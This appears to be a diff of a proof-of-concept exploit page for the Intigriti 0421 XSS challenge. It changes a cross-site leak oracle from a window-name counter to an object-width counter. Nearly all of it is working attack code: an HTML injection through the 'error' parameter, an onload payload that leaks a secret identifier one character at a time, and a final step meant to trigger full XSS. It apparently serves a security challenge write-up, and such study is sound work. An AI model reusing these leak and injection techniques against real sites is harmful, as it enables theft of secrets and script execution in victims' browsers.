@@ -2,82 +2,55 @@
 
 <head>
     <meta charset="utf-8">
-    <meta http-equiv="Cache-Control" content="no-store">
     <style>iframe {display: none}</style>
 </head>
 
 <body>
     <span>Leaked identifier: <code id=leakedIdentifier></code></span>
 
-    <!-- Create sandbox iframe to prevent creating new popups -->
-    <iframe sandbox="allow-scripts allow-top-navigation allow-same-origin" name="testFrame"></iframe>
     <script>
         // The idea is to create an oracle with onSMTH that can be repeated over and over
         // I used <object onload=> that can be repeated over and over because it triggers
-        // With every request. When the comparision is true, iframe.location++ is called
-        // which when same-origin will change the location. that is one of the possible
-        // xs-leaks of each character. there are probably plenty more solutions to leak
-        // the identifier though.
+        // With every request. When the comparision is true, width++ is called
+        // which increases the width of the injected object. It is inspired by @holme_sec solution
 
         const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
         const payload = alph.split('').map(c =>
-            `location.hash+/${c}/.source</##/.source+identifier&&++top.name`
+            `location.hash+/${c}/.source</##/.source+identifier&&++width`
         ).join(',')
 
         const thisUrl = location.href.replace('http://', 'https://');
         const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
-            `<object style=width:100% name=x data=${thisUrl}></object><object data=` +
+            `<object style=width:100% name=x data=${thisUrl}></object><object width=0 data=` +
             `//${location.host}/empty.html name=lload onload=${payload}></object>`
         );
 
+        const sleep = d => new Promise(r=>setTimeout(r,d));
         if (top === window) {
             let startPoc = confirm("Start poc?");
             if(!startPoc) throw /stopped/;
-            name = 0;
             location = top_url + '##'
             throw /stop/
         }
 
         let lastValue = 0;
         let identifier = '';
-        let stop = false;
 
         // for performance measurement
         const startTime = Date.now();
 
-        async function getTopName() {
-            let i = 0;
-            // it's just magic. tl;dr chrome and firefox work differently 
-            // but this polyglot works for both;
-            for (; i < alph.length + 1; i++) {
-                let res = await (async () => {
-                    let x;
-                    try {
-                        // shouldn't trigger new navigation
-                        x = testFrame.open('xxxx://no-trigger', i + lastValue);
-                        // this is for firefox
-                        if (x !== null) return 1;
-                        return;
-                    } catch (e) {}
-                })();
-                if (res) break;
-            }
-            return i + lastValue;
-        }
+        async function watchForWidthChange() {
+            let width = top.lload.innerWidth;
 
-        async function watchForNameChange() {
-            let topName = await getTopName();
-            if (topName !== lastValue) {
-                const newTopName = topName - lastValue;
-                lastValue = topName;
-                new_char(newTopName - 1);
-            } else {
-                setTimeout(watchForNameChange, 60);
+            if (width !== lastValue) {
+                await sleep(60);
+                width = top.lload.innerWidth;
+                const newWidth = width - lastValue;
+                lastValue = width;
+                new_char(newWidth - 1);
+            }else{
+                setTimeout(watchForWidthChange, 0);
             }
-        }
-
-        function oracleLoaded() {
-            watchForNameChange();
         }
 
         function log(identifier) {
@@ -97,7 +70,7 @@
             log(identifier);
             top.location = top_url + '##' + identifier;
             top.lload.location = URL.createObjectURL(new Blob([
-                '<script>onload=top.x.oracleLoaded<\/script>'
+                `<script>onload=top.x.watchForWidthChange<\/script>`
             ], {
                 type: 'text/html'
             }));
@@ -105,7 +78,6 @@
 
         // once the identifier is leaked, use it to trigger full blown XSS
         function solve(identifier) {
-            stop = true;
             const pocTime = ((Date.now() - startTime) / 1000).toFixed(2);
             top.postMessage({
                 type: 'waf',
@@ -119,7 +91,7 @@
         }
 
         onload = () => {
-            setTimeout(watchForNameChange, 60);
+            watchForWidthChange();
         }
     </script>
 
